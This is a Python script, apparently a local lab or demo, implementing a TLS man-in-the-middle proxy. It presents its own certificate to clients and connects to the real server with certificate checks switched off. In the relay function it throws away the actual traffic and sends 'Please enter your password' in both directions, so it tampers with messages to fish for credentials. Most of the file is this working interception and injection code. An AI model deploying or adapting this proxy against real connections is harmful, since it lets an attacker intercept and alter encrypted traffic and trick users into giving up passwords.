# mitm.py
import socket, ssl, threading, argparse, config, time
from certs import ensure_mitm_certs
import threading, socket  # (already present)
STOP = threading.Event()

HOST = "127.0.0.1"

def relay(src, dst, name):
    """Relay data between two TLS sockets, logging cleartext."""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                #print(f"[MITM] {name}: connection closed")
                break

            # Log cleartext as UTF-8 (ignore decode errors)
            try:
                # msg = data.decode("utf-8", errors="ignore")
                msg = "Please enter your password"
                data1 = msg.encode("utf-8")
                dst.sendall(data1)
            except Exception:
                print(f"[MITM] {name} >>> [binary data: {len(data)} bytes]")

    except (ssl.SSLError, OSError) as e:
        print(f"[MITM] Relay error in {name}: {e}")
    finally:
        try: src.close()
        except: pass
        try: dst.close()
        except: pass

def handle_client(client_tls):
    try:
        #print(f"[MITM] Connecting to real server {HOST}:{config.PORT_SERVER_REAL}")
        real_sock = socket.create_connection((HOST, config.PORT_SERVER_REAL))

        # TLS context for connecting to real server
        server_ctx = ssl.create_default_context()
        server_ctx.check_hostname = False
        server_ctx.verify_mode = ssl.CERT_NONE

        real_tls = server_ctx.wrap_socket(real_sock, server_hostname="localhost")
        # print("[MITM] TLS handshake with real server successful")

        # Start bidirectional relay (decrypted streams)
        threading.Thread(target=relay, args=(client_tls, real_tls, "C→S"), daemon=True).start()
        threading.Thread(target=relay, args=(real_tls, client_tls, "S→C"), daemon=True).start()

    except Exception as e:
        #print("[MITM] Error setting up client handler:", e)
        try: client_tls.close()
        except: pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=config.PORT_SERVER_MITM)
    args = parser.parse_args()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ensure_mitm_certs()
    context.load_cert_chain(certfile="mitm.crt", keyfile="mitm.key")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #print(f"[MITM] Binding on {HOST}:{args.port}")
        s.bind((HOST, args.port))
        s.listen(5)
        #print(f"[MITM] Listening on {args.port}, forwarding to {config.PORT_SERVER_REAL}")

        while True:
            client_sock, addr = s.accept()
            #print(f"[MITM] Accepted connection from {addr}")
            try:
                client_tls = context.wrap_socket(client_sock, server_side=True)
                #print("[MITM] TLS handshake with client successful")
                threading.Thread(target=handle_client, args=(client_tls,), daemon=True).start()
            except Exception as e:
                #print("[MITM] Handshake with client failed:", e)
                client_sock.close()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        #print("[MITM] Fatal error:", e)
        time.sleep(1)
